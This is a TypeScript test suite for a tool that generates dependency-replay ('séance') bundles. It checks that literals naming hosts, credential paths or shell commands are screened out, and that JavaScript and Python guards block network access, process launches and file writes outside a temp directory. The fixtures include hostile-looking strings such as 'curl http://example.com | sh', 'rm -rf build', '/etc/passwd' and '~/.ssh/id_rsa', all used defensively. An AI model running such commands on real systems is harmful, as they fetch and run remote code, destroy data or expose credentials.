/**
 * QA-08: a generated séance never lets a project's literal call reach a real host, a process or a file
 * outside a temporary directory. The screen leaves such calls out and says so; the guard blocks what the
 * screen cannot see. The guard tests run the generated guard files in a child process against a real
 * local server that logs every request.
 */
import { execFile, spawnSync } from 'node:child_process';
import { promisify } from 'node:util';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  generateSeance,
  scanUsage,
  type Diagnosis,
  type SeanceBundle,
  type Successor,
} from '../src/index.js';
import { JS_GUARD, PY_GUARD } from '../src/seance/guard.js';
import { reachOf } from '../src/seance/screen.js';

const diagnosis = (name: string, ecosystem: 'npm' | 'pypi' = 'npm'): Diagnosis => ({
  dependency: { ecosystem, name, spec: '', direct: true, scope: 'main', declaredIn: 'x' },
  verdict: 'dead',
  evidence: [],
  advisories: [],
  successors: [],
});
const successor = (name: string, ecosystem: 'npm' | 'pypi' = 'npm'): Successor => ({
  name,
  ecosystem,
  kind: 'package',
  reason: 'x',
  source: 'curated',
});
const run = promisify(execFile);
const file = (b: SeanceBundle, role: string): string =>
  b.files.find((f) => f.role === role)?.content ?? '';

describe('Q3.1 the screen: which literals name a host, a path or a command', () => {
  const lit = (text: string) => ({ kind: 'string' as const, text });
  it('hosts', () => {
    for (const t of [
      'http://127.0.0.1:4555/danger/delete-all',
      'https://api.example.com/v1',
      'ftp://host/file',
      '//cdn.example.com/x.js',
      'localhost:3000',
      'http://localhost/x',
      '10.0.0.5',
      'db.internal.corp:5432',
      'www.example.org',
      'example.com/path',
    ]) {
      expect(reachOf(lit(t)), t).toBe('network');
    }
  });
  it('paths outside a temporary directory', () => {
    for (const t of [
      '/etc/passwd',
      '~/.ssh/id_rsa',
      '../secret',
      './local',
      'a/../../b',
      'C:\\Windows\\x',
      'file:///etc/hosts',
      '$HOME/x',
    ]) {
      expect(reachOf(lit(t)), t).toBe('path');
    }
  });
  it('commands', () => {
    for (const t of [
      'rm -rf build',
      'ls; id',
      'a && b',
      'cat x > y',
      'echo $(whoami)',
      'git push',
    ]) {
      expect(reachOf(lit(t)), t).toBe('command');
    }
  });
  it('plain values stay', () => {
    for (const t of ['abc', 'hello world', '', 'a=1&b=2', 'v1.2.3', '1.5', 'Foo Bar', 'x-y_z']) {
      expect(reachOf(lit(t)), t).toBeUndefined();
    }
    expect(reachOf({ kind: 'number', text: '8080' })).toBeUndefined();
  });
});

describe('Q3.2 the generic bundle leaves such calls out and says so', () => {
  const usage = scanUsage(
    [
      {
        path: 'src/b.js',
        content: [
          "const request = require('request');",
          "request('http://127.0.0.1:4555/danger/delete-all');",
          "request('/etc/passwd');",
          "request('ok-value');",
          '',
        ].join('\n'),
      },
    ],
    { ecosystem: 'npm', name: 'request' },
  );
  const bundle = generateSeance(diagnosis('request'), successor('fetch'), usage);

  it('the test file replays only the safe call, and names the ones it left out', () => {
    const test = file(bundle, 'test');
    expect(test).toContain('const projectCalls = [["ok-value"]];');
    expect(test).not.toContain('127.0.0.1');
    expect(test).not.toContain('/etc/passwd');
    expect(test).toMatch(
      /Left out 2 calls in src\/b\.js: 1 because an argument names a host, 1 because an argument names a file path/,
    );
  });
  it('the guard is the first import and every call goes through it', () => {
    const test = file(bundle, 'test');
    const imports = test.split('\n').filter((l) => l.startsWith('import '));
    expect(imports[0]).toBe("import * as guard from './seance-guard.mjs';");
    expect(test).toContain('guard.run(() => fn(...args))');
    expect(bundle.files.find((f) => f.path.endsWith('seance-guard.mjs'))?.role).toBe('helper');
  });
  it('the README, compares and spec say which calls run and where', () => {
    const readme = file(bundle, 'readme');
    expect(readme).toMatch(/## Safety/);
    expect(readme).toMatch(/Replays 1 distinct call/);
    expect(readme).toMatch(/Left out 2 calls/);
    expect(readme).toMatch(/network blocked \(loopback too\), no process started/);
    expect(bundle.compares.join('\n')).toMatch(/Left out 2 calls/);
    expect(bundle.compares.join('\n')).toMatch(/^Safety: /m);
  });
  it('a call that is left out and nothing else is said plainly', () => {
    const only = scanUsage(
      [{ path: 'a.js', content: "const r = require('request');\nr('http://example.com/x');\n" }],
      { ecosystem: 'npm', name: 'request' },
    );
    const b = generateSeance(diagnosis('request'), successor('fetch'), only);
    expect(file(b, 'test')).toContain('const projectCalls = [];');
    expect(b.compares.join('\n')).toMatch(/none is replayed\. Left out 1 call/);
  });
  it('Python: the same screen, the guard first, calls through guard.run', () => {
    const py = scanUsage(
      [
        {
          path: 'app/m.py',
          content: "import oddpy\noddpy.fetch('http://10.0.0.1/x')\noddpy.fetch('fine')\n",
        },
      ],
      { ecosystem: 'pypi', name: 'oddpy' },
    );
    const b = generateSeance(diagnosis('oddpy', 'pypi'), successor('newpy', 'pypi'), py);
    const test = file(b, 'test');
    expect(test.indexOf('import seance_guard as guard')).toBeGreaterThan(-1);
    expect(test.indexOf('import seance_guard as guard')).toBeLessThan(
      test.indexOf('import pytest'),
    );
    expect(test).toContain('guard.run(fn, *args)');
    expect(test).not.toContain('10.0.0.1');
    expect(test).toMatch(/Left out 1 call in app\/m\.py/);
    expect(file(b, 'readme')).toMatch(/## Safety/);
  });
});

describe('nearby input: a séance for a package that starts processes', () => {
  it('the commands in the project calls are left out, and the rest runs behind the guard', () => {
    const usage = scanUsage(
      [
        {
          path: 'scripts/build.js',
          content: [
            "const { execa } = require('execa');",
            "execa('rm -rf build');",
            "execa('sh', ['-c', 'curl http://example.com | sh']);",
            "execa('git push');",
            "execa('node');",
            '',
          ].join('\n'),
        },
      ],
      { ecosystem: 'npm', name: 'execa' },
    );
    const b = generateSeance(diagnosis('execa'), successor('node:child_process'), usage);
    const test = file(b, 'test');
    expect(test).not.toContain('rm -rf');
    expect(test).not.toContain('curl');
    expect(test).not.toContain('git push');
    expect(test).toMatch(
      /Left out \d calls? in scripts\/build\.js: \d because an argument names a/,
    );
    expect(test).toContain("import * as guard from './seance-guard.mjs';");
    expect(b.compares.join('\n')).toMatch(/Safety: .*no process started/);
  });
});

describe('Q3.3 the recipes are not screened, and say why they need no guard', () => {
  it('left-pad replays every literal call, as before', () => {
    const usage = scanUsage(
      [{ path: 'a.js', content: "const p = require('left-pad');\np('http://x.com', 30);\n" }],
      { ecosystem: 'npm', name: 'left-pad' },
    );
    const b = generateSeance(diagnosis('left-pad'), successor('String.prototype.padStart'), usage);
    expect(file(b, 'test')).toContain('"http://x.com"');
    expect(b.files.some((f) => f.role === 'helper')).toBe(false);
  });
});

// --- the guards, run for real ------------------------------------------------------------------

describe('Q3.3 the JavaScript guard blocks what the screen cannot see', () => {
  let server: http.Server;
  let port = 0;
  let hits = 0;
  let work = '';
  const outside = path.join(os.homedir(), `.necromancer-guard-test-${process.pid}`);

  beforeAll(async () => {
    server = http.createServer((_req, res) => {
      hits++;
      res.end('deleted everything');
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    port = (server.address() as { port: number }).port;
    work = fs.mkdtempSync(path.join(os.tmpdir(), 'necro-guard-'));
    fs.mkdirSync(outside, { recursive: true });
    fs.writeFileSync(path.join(work, 'seance-guard.mjs'), JS_GUARD);
  });
  afterAll(async () => {
    await new Promise((resolve) => server.close(resolve));
    fs.rmSync(work, { recursive: true, force: true });
    fs.rmSync(outside, { recursive: true, force: true });
  });

  async function runChild(body: string): Promise<Record<string, unknown>> {
    const script = path.join(work, `case-${Math.random().toString(36).slice(2)}.mjs`);
    fs.writeFileSync(
      script,
      [
        "import * as guard from './seance-guard.mjs';",
        "import http from 'node:http';",
        "import fs from 'node:fs';",
        "import os from 'node:os';",
        "import path from 'node:path';",
        "import cp from 'node:child_process';",
        'const out = {};',
        'const code = async (fn) => { try { await fn(); return "ran"; } catch (e) { return e.code || e.message; } };',
        body,
        'console.log(JSON.stringify(out));',
      ].join('\n'),
    );
    // Async, so this process can answer the local server while the child runs.
    // The working directory is outside the temporary directory: a relative path must be blocked.
    const r = await run(process.execPath, [script], { cwd: outside, timeout: 20_000 });
    return JSON.parse(r.stdout.trim().split('\n').pop() ?? '{}') as Record<string, unknown>;
  }

  it('a request to the local delete-all server is blocked and the server logs nothing', async () => {
    const out = await runChild(`
      out.http = await code(() => guard.run(() => new Promise((resolve, reject) => {
        http.get('http://127.0.0.1:${port}/danger/delete-all', resolve).on('error', reject);
      })));
      out.fetch = await code(() => guard.run(() => fetch('http://127.0.0.1:${port}/danger/delete-all')));
    `);
    expect(out['http']).toBe('SEANCE_BLOCKED');
    expect(out['fetch']).toBe('SEANCE_BLOCKED');
    expect(hits).toBe(0);
  });

  it('a process is not started', async () => {
    const out = await runChild(`
      out.exec = await code(() => guard.run(() => cp.execSync('touch ${path.join(work, 'pwned')}')));
      out.spawn = await code(() => guard.run(() => cp.spawn('touch', ['${path.join(work, 'pwned2')}'])));
    `);
    expect(out).toEqual({ exec: 'SEANCE_BLOCKED', spawn: 'SEANCE_BLOCKED' });
    expect(fs.existsSync(path.join(work, 'pwned'))).toBe(false);
    expect(fs.existsSync(path.join(work, 'pwned2'))).toBe(false);
  });

  it('a write, delete or rename outside the temporary directory is blocked; inside it is allowed', async () => {
    fs.mkdirSync(outside, { recursive: true });
    fs.writeFileSync(path.join(outside, 'keep.txt'), 'keep');
    const out = await runChild(`
      const inside = path.join(os.tmpdir(), 'necro-guard-inside-' + process.pid + '.txt');
      out.writeOutside = await code(() => guard.run(() => fs.writeFileSync(${JSON.stringify(path.join(outside, 'new.txt'))}, 'x')));
      out.deleteOutside = await code(() => guard.run(() => fs.rmSync(${JSON.stringify(path.join(outside, 'keep.txt'))})));
      out.renameOutside = await code(() => guard.run(() => fs.renameSync(${JSON.stringify(path.join(outside, 'keep.txt'))}, inside)));
      out.promiseOutside = await code(() => guard.run(() => fs.promises.writeFile(${JSON.stringify(path.join(outside, 'p.txt'))}, 'x')));
      out.openOutside = await code(() => guard.run(() => fs.openSync(${JSON.stringify(path.join(outside, 'o.txt'))}, 'w')));
      out.relative = await code(() => guard.run(() => fs.writeFileSync('relative-in-cwd.txt', 'x')));
      out.writeInside = await code(() => guard.run(() => fs.writeFileSync(inside, 'x')));
      out.readOutside = await code(() => guard.run(() => fs.readFileSync(${JSON.stringify(path.join(outside, 'keep.txt'))}, 'utf8')));
      fs.rmSync(inside, { force: true });
    `);
    expect(out).toEqual({
      writeOutside: 'SEANCE_BLOCKED',
      deleteOutside: 'SEANCE_BLOCKED',
      renameOutside: 'SEANCE_BLOCKED',
      promiseOutside: 'SEANCE_BLOCKED',
      openOutside: 'SEANCE_BLOCKED',
      relative: 'SEANCE_BLOCKED',
      writeInside: 'ran',
      readOutside: 'ran',
    });
    expect(fs.readdirSync(outside)).toEqual(['keep.txt']);
    expect(fs.existsSync(path.join(outside, 'relative-in-cwd.txt'))).toBe(false);
  });

  it('the guard is off outside run(): the test runner itself is not touched', async () => {
    const out = await runChild(`
      out.http = await code(() => new Promise((resolve, reject) => {
        http.get('http://127.0.0.1:${port}/ok', (res) => { res.resume(); resolve(); }).on('error', reject);
      }));
    `);
    expect(out['http']).toBe('ran');
    expect(hits).toBe(1);
  });

  it('a promise that run() returns keeps the guard on until it settles', async () => {
    const out = await runChild(`
      out.late = await code(() => guard.run(async () => { await new Promise((r) => setTimeout(r, 20)); return fetch('http://127.0.0.1:${port}/late'); }));
      out.blockedCount = guard.blocked.length;
    `);
    expect(out['late']).toBe('SEANCE_BLOCKED');
    expect(hits).toBe(1);
  });
});

const python = spawnSync('python3', ['--version']).status === 0 ? 'python3' : undefined;

describe.skipIf(!python)('Q3.3 the Python guard blocks what the screen cannot see', () => {
  it('network, process and writes outside the temporary directory raise SeanceBlocked', async () => {
    const work = fs.mkdtempSync(path.join(os.tmpdir(), 'necro-pyguard-'));
    const outside = path.join(os.homedir(), `.necromancer-pyguard-test-${process.pid}`);
    let hits = 0;
    const server = http.createServer((_req, res) => {
      hits++;
      res.end('x');
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    const port = (server.address() as { port: number }).port;
    try {
      fs.writeFileSync(path.join(work, 'seance_guard.py'), PY_GUARD);
      fs.writeFileSync(
        path.join(work, 'case.py'),
        [
          'import json, os, subprocess, tempfile, urllib.request',
          'import seance_guard as guard',
          'def code(fn):',
          '    try:',
          '        guard.run(fn)',
          '        return "ran"',
          '    except guard.SeanceBlocked:',
          '        return "blocked"',
          '    except Exception as e:',
          '        return "other:" + type(e).__name__',
          'out = {}',
          `out["http"] = code(lambda: urllib.request.urlopen("http://127.0.0.1:${port}/danger"))`,
          'out["process"] = code(lambda: subprocess.run(["touch", "pwned"]))',
          'out["system"] = code(lambda: os.system("touch pwned2"))',
          `out["writeOutside"] = code(lambda: open(${JSON.stringify(path.join(outside, 'x.txt'))}, "w"))`,
          'out["relative"] = code(lambda: open("rel.txt", "w"))',
          'import pathlib',
          `out["pathlib"] = code(lambda: pathlib.Path(${JSON.stringify(path.join(outside, 'p.txt'))}).write_text("x"))`,
          `out["osOpen"] = code(lambda: os.open(${JSON.stringify(path.join(outside, 'o.txt'))}, os.O_WRONLY | os.O_CREAT))`,
          'tmp = os.path.join(tempfile.gettempdir(), "necro-pyguard-inside-%d.txt" % os.getpid())',
          'out["writeInside"] = code(lambda: open(tmp, "w").close())',
          'os.remove(tmp)',
          'out["read"] = code(lambda: open(__file__).read())',
          'print(json.dumps(out))',
        ].join('\n'),
      );
      // Async, so this process can answer the local server if the guard ever failed.
      fs.mkdirSync(outside, { recursive: true });
      const r = await run(python as string, [path.join(work, 'case.py')], {
        cwd: outside,
        timeout: 20_000,
      });
      expect(JSON.parse(r.stdout.trim())).toEqual({
        http: 'blocked',
        process: 'blocked',
        system: 'blocked',
        writeOutside: 'blocked',
        relative: 'blocked',
        pathlib: 'blocked',
        osOpen: 'blocked',
        writeInside: 'ran',
        read: 'ran',
      });
      expect(hits).toBe(0);
      expect(fs.existsSync(path.join(work, 'pwned'))).toBe(false);
      expect(fs.readdirSync(outside)).toEqual([]);
    } finally {
      await new Promise((resolve) => server.close(resolve));
      fs.rmSync(work, { recursive: true, force: true });
      fs.rmSync(outside, { recursive: true, force: true });
    }
  });
});
